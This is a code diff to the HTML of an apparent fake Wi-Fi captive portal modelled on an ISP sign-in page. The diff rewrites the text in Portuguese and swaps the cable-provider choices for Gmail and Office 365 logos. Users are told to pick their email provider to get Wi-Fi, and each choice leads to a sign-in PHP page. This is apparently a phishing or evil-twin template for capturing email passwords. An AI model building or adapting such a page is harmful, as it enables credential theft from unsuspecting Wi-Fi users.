@@ -33,19 +33,17 @@ require_once('helper.php');
     <div id="myApp">
 
       <!--[if IE]>
-      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+      <p class="browserupgrade">Você está usando um browser desatualizado. Por favor atualize-o</a> para melhorar sua experiência.</p>
       <![endif]-->
 
       <main class="main-container cw-container cw-toolbar-fixed-adjust" role="main">
         <header role="banner">
-          <h1>Welcome!</h1>
-          <p>To use WiFi, please select your internet service provider.</p>
+          <h1>Olá!</h1>
+          <p>Para usar o Wi-Fi, selecione o seu provedor de e-mail.</p>
         </header>
         <ul class="provider-list">
-          <li><a class="cw-card" href="signince44.php?mso=cox"><img class="cox-logo" src="assets/images/Cox_4C.png" alt="Cox"></a></li>
-          <li><a class="cw-card" href="signin8d07.php?mso=cvc"><img class="optimum-logo" src="assets/images/cvc-logo.svg" alt="Optimum"></a></li>
-          <li><a class="cw-card" href="signin209b.php?mso=spectrum"><img class="spectrum-logo" src="assets/images/spectrum-logo.svg" alt="Spectrum"></a></li>
-          <li><a class="cw-card" href="signin5d8f.php?mso=ccc"><img class="xfinity-logo" src="assets/images/ccc-logo.svg" alt="Xfinity"></a></li>
+          <li><a class="cw-card" href="signince44.php?mso=cox"><img class="cox-logo" src="assets/images/google-logo.png" alt="Gmail"></a></li>
+          <li><a class="cw-card" href="signin8d07.php?mso=cvc"><img class="optimum-logo" src="assets/images/office-365-logo.png" alt="Optimum"></a></li>
         </ul>
       </main>
     </div><!-- /#myApp -->
